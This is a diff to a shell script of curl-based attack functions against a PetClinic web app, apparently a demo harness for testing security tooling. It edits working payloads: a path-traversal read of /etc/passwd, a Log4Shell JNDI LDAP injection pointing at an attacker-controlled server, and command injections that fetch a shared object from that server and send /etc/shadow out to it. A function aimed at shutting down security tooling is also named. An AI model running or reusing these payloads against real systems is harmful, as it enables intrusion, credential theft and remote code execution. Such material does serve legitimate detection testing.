@@ -18,7 +18,6 @@ fi
 
 
 
-
 loginToPetclinic() {
   cookie=$(curl 'http://'"$host"':8080/login' \
     -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
@@ -75,7 +74,7 @@ performPathTraversalUpload() {
 
 performPathTraversalDownload() {
   loginToPetclinic
-  curl -v --cookie <(echo "$cookie") 'http://'"$host"':8080/owners/1/pets/getPhotoByPath?photoPath=../../../../../../../../..//etc/passwd' \
+  curl -v --cookie <(echo "$cookie") 'http://'"$host"':8080/owners/1/pets/getPhotoByPath?photoPath=../../../../../../../../../etc/passwd' \
     -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
     -H 'Accept-Language: en-GB,en;q=0.9' \
     -H 'Connection: keep-alive' \
@@ -91,25 +90,9 @@ performPathTraversalDownload() {
 }
 
 performTrojanInjection() {
-  loginToPetclinic
-  curl --cookie <(echo "$cookie") 'http://'"$host"':8080/owners/new' \
-    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
-    -H 'Accept-Language: en-GB,en;q=0.9' \
-    -H 'Cache-Control: max-age=0' \
-    -H 'Connection: keep-alive' \
-    -H 'Content-Type: application/x-www-form-urlencoded' \
-    -H 'Origin: http://'"$host"':8080' \
-    -H 'Referer: http://'"$host"':8080/owners/new' \
-    -H 'Sec-Fetch-Dest: document' \
-    -H 'Sec-Fetch-Mode: navigate' \
-    -H 'Sec-Fetch-Site: same-origin' \
-    -H 'Sec-Fetch-User: ?1' \
-    -H 'Upgrade-Insecure-Requests: 1' \
-    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' \
-    -H 'sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"' \
-    -H 'sec-ch-ua-mobile: ?0' \
-    -H 'sec-ch-ua-platform: "macOS"' \
-    --data-raw 'firstName=$%7Bjndi:ldap://'"$jndiserver"':1389/jdk8adr%7D&lastName=test&address=test&city=test&telephone=123'
+    curl --location 'http://'"$host"':8081/registerEmail' \
+    --header 'Content-Type: application/json' \
+    --data-raw '{"firstName":"${jndi:ldap://'"$jndiserver"':1389/jdk8adr}","lastName":"test a","address":"test","city":"test","telephone":"123","email":"test@test.com"}'
 }
 
 performEtcPasswordRead() {
@@ -209,11 +192,11 @@ performCommandInjectionCatEtcShadow() {
 }
 
 performCommandInjectionDownloadSharedObject() {
-  curl 'http://'"$host"':8081/cmd?arg=curl%20-o%20/tmp/pe%20http://'"$jndiserver"':8180/pe.so%0A'
+  curl 'http://'"$host"':8081/cmd?arg=curl%20-o%20/tmp/pe.so%20http://'"$jndiserver"':8180/pe.so'
 }
 
 performCommandInjectionUploadShadowFile() {
-  curl 'http://'"$host"':8081/cmd?arg=curl%20-X%20POST%20-F%20%22file=@/etc/shadow%22%20http://'"$jndiserver"':8180/upload%0A'
+  curl 'http://'"$host"':8081/cmd?arg=curl%20-X%20POST%20-F%20%22file=@/etc/shadow%22%20http://'"$jndiserver"':8180/upload'
 }
 
 performCommandInjectionShutDownSecurityTooling() {
